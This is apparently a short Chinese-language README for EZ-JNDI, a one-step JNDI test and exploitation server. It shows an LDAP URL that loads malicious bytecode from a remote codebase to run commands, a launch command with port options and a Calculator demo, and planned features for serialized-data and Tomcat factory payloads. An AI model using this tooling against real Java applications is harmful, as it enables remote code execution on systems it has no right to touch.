# EZ-JNDI
一键启动JNDI测试/利用环境。

```text
ldap://0.0.0.0:1099/Foo --> 利用远程CodeBase加载恶意字节码执行命令
```

LDAP默认端口1099，HTTP默认端口8080，可以使用命令行参数配置端口：
```text
java -jar ezjndi1.0.jar -lp={port1} -hp={port2} -c="open -a Calculator"
```

![img.png](img/img.png)

TODO:
- 直接返回序列化数据
- 返回Tomcat恶意本地Factory